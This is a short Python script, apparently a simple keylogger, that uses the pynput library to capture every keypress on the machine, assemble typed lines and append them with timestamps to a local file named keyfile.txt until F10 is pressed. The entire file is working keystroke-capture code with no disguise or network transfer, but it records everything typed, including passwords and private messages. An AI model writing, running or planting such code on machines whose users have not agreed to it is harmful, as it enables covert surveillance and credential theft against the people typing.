from pynput import keyboard
import datetime

current_line = ""

def keyPressed(key):
    global current_line
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            current_line += char
        except AttributeError:
            # Handle special keys
            if key == keyboard.Key.enter or key == keyboard.Key.tab:
                logKey.write(f"{timestamp} - {current_line}\n")
                current_line = ""
            elif key == keyboard.Key.backspace:
                # Remove last character when backspace is pressed
                current_line = current_line[:-1]
            elif key == keyboard.Key.space:
                current_line += " "
            else:
                current_line += f"[Unhandled_Special_Key]"

def on_release(key):
    # Stop the listener on pressing 'F10'
    if key == keyboard.Key.f10:
        return False

if __name__ == '__main__':
    listener = keyboard.Listener(on_press=keyPressed, on_release=on_release)
    listener.start()
    listener.join()
